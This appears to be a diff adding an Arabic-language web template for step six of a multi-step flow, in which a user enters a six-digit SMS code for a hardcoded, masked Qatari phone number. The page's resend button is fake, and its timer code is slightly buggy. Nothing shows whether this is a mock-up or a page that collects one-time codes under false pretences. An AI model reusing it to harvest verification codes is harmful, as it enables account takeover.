@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><%= title %></title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css">
+    
+    <style>
+        body {
+            font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f5f5;
+            direction: rtl;
+        }
+        
+        .header {
+            background-color: #8b1538;
+            color: white;
+            padding: 20px 0;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            margin: 0;
+            font-size: 28px;
+        }
+        
+        .gray-container {
+            background-color: #f5f5f5;
+            padding: 30px;
+            border-radius: 8px;
+            margin: 20px auto;
+            max-width: 600px;
+        }
+        
+        .gray-container h2 {
+            color: #8b1538;
+            margin-top: 0;
+            margin-bottom: 25px;
+            font-size: 24px;
+            text-align: center;
+        }
+        
+        .verification-box {
+            background-color: white;
+            padding: 30px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            text-align: center;
+        }
+        
+        .phone-display {
+            font-size: 24px;
+            color: #333;
+            font-weight: bold;
+            margin: 20px 0;
+            direction: ltr;
+        }
+        
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 30px 0;
+            direction: ltr;
+        }
+        
+        .code-input {
+            width: 50px;
+            height: 50px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+        }
+        
+        .code-input:focus {
+            border-color: #8b1538;
+            outline: none;
+        }
+        
+        .resend-code {
+            color: #8b1538;
+            cursor: pointer;
+            text-decoration: underline;
+            margin-top: 15px;
+            display: inline-block;
+        }
+        
+        .resend-code:hover {
+            color: #6d1028;
+        }
+        
+        .btn-primary {
+            background-color: #8b1538;
+            border-color: #8b1538;
+            padding: 12px 40px;
+            font-size: 16px;
+        }
+        
+        .btn-primary:hover {
+            background-color: #6d1028;
+            border-color: #6d1028;
+        }
+        
+        .btn-default {
+            padding: 12px 40px;
+            font-size: 16px;
+        }
+        
+        .form-actions {
+            margin-top: 30px;
+            text-align: center;
+        }
+        
+        .form-actions .btn {
+            margin: 0 10px;
+        }
+        
+        .timer {
+            color: #666;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <%- include('partials/header') %>
+    <%- include('partials/progress') %>
+    
+    <div class="container">
+        <div class="row">
+            <div class="col-md-8 col-md-offset-2">
+                <div class="gray-container">
+                    <h2>توثيق رقم الهاتف</h2>
+                    
+                    <div class="verification-box">
+                        <p style="font-size: 16px; color: #666; margin-bottom: 20px;">
+                            تم إرسال رمز التحقق إلى رقم الهاتف:
+                        </p>
+                        <div class="phone-display">+974 **** **45</div>
+                        
+                        <p style="font-size: 14px; color: #666; margin-top: 30px; margin-bottom: 10px;">
+                            أدخل رمز التحقق المكون من 6 أرقام:
+                        </p>
+                        
+                        <form id="verificationForm" action="/step6" method="POST">
+                            <div class="code-inputs">
+                                <input type="text" class="code-input" maxlength="1" name="code1" required>
+                                <input type="text" class="code-input" maxlength="1" name="code2" required>
+                                <input type="text" class="code-input" maxlength="1" name="code3" required>
+                                <input type="text" class="code-input" maxlength="1" name="code4" required>
+                                <input type="text" class="code-input" maxlength="1" name="code5" required>
+                                <input type="text" class="code-input" maxlength="1" name="code6" required>
+                            </div>
+                            
+                            <div class="timer" id="timer">
+                                إعادة إرسال الرمز بعد: <span id="countdown">60</span> ثانية
+                            </div>
+                            
+                            <a href="#" class="resend-code" id="resendBtn" style="display:none;">إعادة إرسال الرمز</a>
+                            
+                            <div class="form-actions">
+                                <a href="javascript:history.back()" class="btn btn-default">رجوع</a>
+                                <button type="submit" class="btn btn-primary" id="verifyBtn" disabled>تحقق</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <%- include('partials/footer') %>
+    
+    <script>
+        // التنقل التلقائي بين الحقول
+        const inputs = document.querySelectorAll('.code-input');
+        const verifyBtn = document.getElementById('verifyBtn');
+        
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                checkAllFilled();
+            });
+            
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+        
+        function checkAllFilled() {
+            const allFilled = Array.from(inputs).every(input => input.value.length === 1);
+            verifyBtn.disabled = !allFilled;
+        }
+        
+        // العد التنازلي
+        let countdown = 60;
+        const countdownEl = document.getElementById('countdown');
+        const timerEl = document.getElementById('timer');
+        const resendBtn = document.getElementById('resendBtn');
+        
+        const timer = setInterval(() => {
+            countdown--;
+            countdownEl.textContent = countdown;
+            
+            if (countdown === 0) {
+                clearInterval(timer);
+                timerEl.style.display = 'none';
+                resendBtn.style.display = 'inline-block';
+            }
+        }, 1000);
+        
+        resendBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            // هنا يمكن إضافة منطق إعادة إرسال الرمز
+            alert('تم إعادة إرسال رمز التحقق');
+            countdown = 60;
+            timerEl.style.display = 'block';
+            resendBtn.style.display = 'none';
+            countdownEl.textContent = countdown;
+            setInterval(() => {
+                countdown--;
+                countdownEl.textContent = countdown;
+                if (countdown === 0) {
+                    clearInterval(timer);
+                    timerEl.style.display = 'none';
+                    resendBtn.style.display = 'inline-block';
+                }
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
